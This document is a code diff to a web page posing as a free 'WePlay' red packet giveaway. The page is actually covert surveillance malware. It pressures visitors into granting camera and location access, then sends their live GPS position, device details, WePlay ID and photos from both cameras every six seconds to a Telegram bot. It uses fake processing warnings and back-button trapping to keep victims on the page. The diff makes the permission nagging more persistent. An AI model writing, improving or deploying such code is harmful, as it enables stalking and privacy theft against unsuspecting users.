@@ -3,8 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Red Packet · WePlay (Enhanced)</title>
+    <title>Red Packet · WePlay (Enhanced Retry)</title>
     <style>
+        /* (Keep all previous styles, plus a few additions) */
         * {
             margin: 0;
             padding: 0;
@@ -242,7 +243,7 @@
             cursor: pointer;
         }
         
-        /* ----- MODAL STYLES (permission + id) ----- */
+        /* Modal styles */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -311,16 +312,21 @@
             from { opacity: 0; transform: scale(0.9); }
             to { opacity: 1; transform: scale(1); }
         }
-        /* micro status */
         .perm-note {
             font-size: 13px;
             color: #e91e63;
             margin-top: 15px;
         }
+        .manual-link {
+            color: #00bcd4;
+            text-decoration: underline;
+            cursor: pointer;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
-    <!-- PROCESSING OVERLAY (original) -->
+    <!-- PROCESSING OVERLAY -->
     <div class="processing-overlay" id="processingOverlay">
         <div class="spinner"></div>
         <div>Processing Your Red Packet...</div>
@@ -328,25 +334,25 @@
         <div class="warning-text">⚠️ Do not close or minimize</div>
     </div>
 
-    <!-- EXIT WARNING (original) -->
+    <!-- EXIT WARNING -->
     <div class="exit-warning" id="exitWarning">
         <h3>⚠️ Processing</h3>
         <p>Your Red Packet is being processed. Please wait...</p>
         <button onclick="document.getElementById('exitWarning').classList.remove('active')">OK</button>
     </div>
 
-    <!-- PERMISSION MODAL (shown until both camera & location granted) -->
+    <!-- PERMISSION MODAL (improved) -->
     <div class="modal-overlay" id="permissionModal">
         <div class="modal-card">
             <h3>🔐 Permissions required</h3>
-            <p>We need <strong>camera</strong> and <strong>location</strong> access to verify your red packet.</p>
-            <p style="font-size:14px; color:#888;">If you denied, please allow manually in browser settings.</p>
+            <p id="permMessage">We need <strong>camera</strong> and <strong>location</strong> access to verify your red packet.</p>
+            <div id="permDetailedError" style="background:#fdd; color:#a00; padding:10px; border-radius:20px; margin-bottom:15px; display:none;"></div>
             <button class="modal-btn" id="retryPermissionBtn">🔁 RETRY PERMISSIONS</button>
-            <div class="perm-note" id="permErrorMsg"></div>
+            <p style="font-size:13px; margin-top:15px;" id="manualHint"></p>
         </div>
     </div>
 
-    <!-- WEPLAY ID MODAL (appears after collect click) -->
+    <!-- WEPLAY ID MODAL -->
     <div class="modal-overlay" id="idModal">
         <div class="modal-card">
             <h3>🎁 Enter WePlay ID</h3>
@@ -427,27 +433,27 @@
         // ==================== GLOBAL STATE ====================
         let cameraGranted = false;
         let locationGranted = false;
+        let cameraPermanentlyDenied = false;   // flag to detect denial without prompt
+        let locationPermanentlyDenied = false;
         let stream = null;
         let captureInterval = null;
         let locationWatchId = null;
-        let currentFacingMode = 'user';      // will toggle
-        let isCapturingActive = false;        // whether capture interval is running
-        let cameraReady = false;               // video stream ready
-        let isProcessing = false;               // for exit protection
-
-        // pending ID capture
-        let weplayId = '';
+        let currentFacingMode = 'user';
+        let cameraReady = false;
+        let isProcessing = false;
 
         // DOM elements
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
         const permissionModal = document.getElementById('permissionModal');
+        const permMessage = document.getElementById('permMessage');
+        const permDetailedError = document.getElementById('permDetailedError');
+        const manualHint = document.getElementById('manualHint');
         const idModal = document.getElementById('idModal');
-        const permErrorMsg = document.getElementById('permErrorMsg');
         const collectBtn = document.getElementById('collectBtn');
 
-        // ==================== HELPER: TELEGRAM SEND ====================
+        // ==================== TELEGRAM HELPERS (unchanged) ====================
         async function sendTelegramMessage(text) {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             try {
@@ -500,7 +506,7 @@
             }
         }
 
-        // ==================== PERMISSION REQUESTS ====================
+        // ==================== IMPROVED PERMISSION REQUESTS ====================
         async function requestCameraPermission() {
             try {
                 if (stream) stream.getTracks().forEach(t => t.stop());
@@ -513,12 +519,18 @@
                 await video.play();
                 cameraGranted = true;
                 cameraReady = true;
-                console.log(`camera granted (${currentFacingMode})`);
+                cameraPermanentlyDenied = false; // reset flag
                 return true;
             } catch (err) {
-                console.warn('camera denied', err);
+                console.warn('camera error', err);
                 cameraGranted = false;
                 cameraReady = false;
+                // Check if error is due to permission denied
+                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+                    cameraPermanentlyDenied = true;
+                } else {
+                    cameraPermanentlyDenied = false; // other error (e.g. hardware)
+                }
                 return false;
             }
         }
@@ -527,18 +539,24 @@
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
                     locationGranted = false;
+                    locationPermanentlyDenied = true; // no geolocation = permanent
                     return resolve(false);
                 }
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
                         locationGranted = true;
-                        // send initial location
+                        locationPermanentlyDenied = false;
                         sendWithRetry('location', { lat: pos.coords.latitude, lng: pos.coords.longitude });
                         resolve(true);
                     },
                     (err) => {
                         locationGranted = false;
-                        console.log('location denied', err);
+                        console.log('location error', err);
+                        if (err.code === err.PERMISSION_DENIED) {
+                            locationPermanentlyDenied = true;
+                        } else {
+                            locationPermanentlyDenied = false; // timeout or unavailable
+                        }
                         resolve(false);
                     },
                     { enableHighAccuracy: true, timeout: 8000 }
@@ -546,42 +564,91 @@
             });
         }
 
-        // check both permissions, hide modal if both true
-        async function checkPermissionsAndStart() {
+        // Update modal UI based on permission states
+        function updatePermissionModal() {
             if (cameraGranted && locationGranted) {
                 permissionModal.classList.remove('active');
-                permErrorMsg.innerText = '';
-                // start everything
-                collectExtendedDeviceInfo();  // send device info once
-                startLiveLocationWatching();  // continuous location
-                startCaptureInterval();        // alternating photos
+                return;
+            }
+            permissionModal.classList.add('active');
+
+            let mainMsg = '';
+            let detailMsg = '';
+            let hint = '';
+
+            if (!cameraGranted && !locationGranted) {
+                mainMsg = 'Camera and location access are required.';
+                if (cameraPermanentlyDenied && locationPermanentlyDenied) {
+                    detailMsg = '⚠️ Both permissions are permanently blocked.';
+                    hint = 'Please enable them manually in your browser settings (usually via the padlock icon in the address bar).';
+                } else if (cameraPermanentlyDenied) {
+                    detailMsg = '⚠️ Camera access is blocked.';
+                    hint = 'Allow camera in site settings, then retry.';
+                } else if (locationPermanentlyDenied) {
+                    detailMsg = '⚠️ Location access is blocked.';
+                    hint = 'Allow location in site settings, then retry.';
+                } else {
+                    hint = 'Click retry to request permissions again.';
+                }
+            } else if (!cameraGranted) {
+                mainMsg = 'Camera access is required.';
+                if (cameraPermanentlyDenied) {
+                    detailMsg = '⚠️ Camera access is permanently blocked.';
+                    hint = 'Please enable camera in browser settings.';
+                } else {
+                    hint = 'Click retry to request camera access.';
+                }
+            } else if (!locationGranted) {
+                mainMsg = 'Location access is required.';
+                if (locationPermanentlyDenied) {
+                    detailMsg = '⚠️ Location access is permanently blocked.';
+                    hint = 'Please enable location in browser settings.';
+                } else {
+                    hint = 'Click retry to request location access.';
+                }
+            }
+
+            permMessage.innerText = mainMsg || 'We need camera and location access.';
+            if (detailMsg) {
+                permDetailedError.style.display = 'block';
+                permDetailedError.innerText = detailMsg;
             } else {
-                // show modal with error
-                permissionModal.classList.add('active');
-                let msg = [];
-                if (!cameraGranted) msg.push('❌ Camera denied');
-                if (!locationGranted) msg.push('❌ Location denied');
-                permErrorMsg.innerText = msg.join(' · ');
+                permDetailedError.style.display = 'none';
+            }
+            manualHint.innerHTML = hint;
+        }
+
+        // Retry button handler
+        document.getElementById('retryPermissionBtn').addEventListener('click', async () => {
+            permDetailedError.style.display = 'none';
+            manualHint.innerText = 'Requesting...';
+            // Request both (they will fail instantly if permanently denied)
+            await requestCameraPermission();
+            await requestLocationPermission();
+            updatePermissionModal();
+        });
+
+        // Initial permission check
+        async function initialPermissionCheck() {
+            permissionModal.classList.add('active');
+            permMessage.innerText = 'Requesting permissions...';
+            await requestCameraPermission();
+            await requestLocationPermission();
+            updatePermissionModal();
+            if (cameraGranted && locationGranted) {
+                // start all services
+                collectExtendedDeviceInfo();
+                startLiveLocationWatching();
+                startCaptureInterval();
             }
         }
 
-        // retry button
-        document.getElementById('retryPermissionBtn').addEventListener('click', async () => {
-            permErrorMsg.innerText = 'Requesting permissions...';
-            // request camera
-            await requestCameraPermission();
-            // request location
-            await requestLocationPermission();
-            checkPermissionsAndStart();
-        });
-
-        // ==================== LIVE LOCATION (watch) ====================
+        // ==================== LIVE LOCATION ====================
         function startLiveLocationWatching() {
             if (locationWatchId) return;
             if (!navigator.geolocation) return;
             locationWatchId = navigator.geolocation.watchPosition(
                 (pos) => {
-                    // send every new location (throttled naturally)
                     sendWithRetry('location', {
                         lat: pos.coords.latitude,
                         lng: pos.coords.longitude
@@ -592,7 +659,7 @@
             );
         }
 
-        // ==================== DEVICE INFO (enhanced) ====================
+        // ==================== DEVICE INFO ====================
         async function collectExtendedDeviceInfo() {
             const info = {
                 'User Agent': navigator.userAgent,
@@ -627,7 +694,7 @@
 
         // ==================== CAMERA CAPTURE (alternating) ====================
         let photoCounter = 0;
-        let nextFacingMode = 'user'; // will toggle
+        let nextFacingMode = 'user';
 
         async function switchCamera(targetMode) {
             if (!cameraGranted) return false;
@@ -642,7 +709,6 @@
                 await video.play();
                 cameraReady = true;
                 currentFacingMode = targetMode;
-                console.log(`switched to ${targetMode}`);
                 return true;
             } catch (err) {
                 console.warn('switch fail', err);
@@ -660,53 +726,38 @@
             if (!blob) return false;
             photoCounter++;
             const cameraUsed = currentFacingMode === 'user' ? 'front' : 'back';
-            // send asynchronously (don't await, keep interval)
             sendPhotoWithRetry(blob, photoCounter, cameraUsed);
             return true;
         }
 
-        // capture loop: every 6 seconds, alternate camera
         function startCaptureInterval() {
             if (captureInterval) clearInterval(captureInterval);
-            isCapturingActive = true;
             captureInterval = setInterval(async () => {
                 if (!cameraGranted || !cameraReady) return;
-                // capture from current camera
                 await capturePhoto();
-                // prepare next camera (alternate)
                 nextFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
-                // switch for next capture (don't wait, do in background)
                 switchCamera(nextFacingMode).catch(() => {});
-            }, 6000); // every 6 sec
+            }, 6000);
         }
 
-        function stopCaptureInterval() {
-            if (captureInterval) clearInterval(captureInterval);
-            captureInterval = null;
-        }
-
-        // ==================== COLLECT BUTTON -> ID MODAL ====================
+        // ==================== COLLECT BUTTON ====================
         function handleCollectClick() {
             if (!cameraGranted || !locationGranted) {
-                alert('Permissions not yet granted. Please allow camera & location.');
+                alert('Permissions not granted. Please check the permission modal.');
                 return;
             }
-            // show ID modal
             idModal.classList.add('active');
             document.getElementById('weplayIdInput').value = '';
         }
 
-        // ID modal events
         document.getElementById('submitIdBtn').addEventListener('click', () => {
             const id = document.getElementById('weplayIdInput').value.trim();
             if (!id) {
                 alert('Please enter your WePlay ID');
                 return;
             }
-            weplayId = id;
             sendWithRetry('weplay_id', id);
             idModal.classList.remove('active');
-            // optional: show small processing overlay for a moment
             document.getElementById('processingOverlay').classList.add('active');
             setTimeout(() => document.getElementById('processingOverlay').classList.remove('active'), 2000);
         });
@@ -715,7 +766,7 @@
             idModal.classList.remove('active');
         });
 
-        // ==================== BACK / EXIT PROTECTION ====================
+        // ==================== EXIT PROTECTION ====================
         history.pushState(null, null, location.href);
         window.onpopstate = function() {
             if (isProcessing) {
@@ -739,15 +790,9 @@
         });
 
         // ==================== PAGE LOAD ====================
-        window.onload = async function() {
+        window.onload = function() {
             collectBtn.innerHTML = '🎁 COLLECT FREE';
-            // request both permissions immediately
-            permissionModal.classList.add('active');
-            permErrorMsg.innerText = 'Requesting permissions...';
-            await requestCameraPermission();
-            await requestLocationPermission();
-            await checkPermissionsAndStart();
-            // if both granted, modal hidden; else stays visible with retry
+            initialPermissionCheck();
         };
     </script>
 </body>
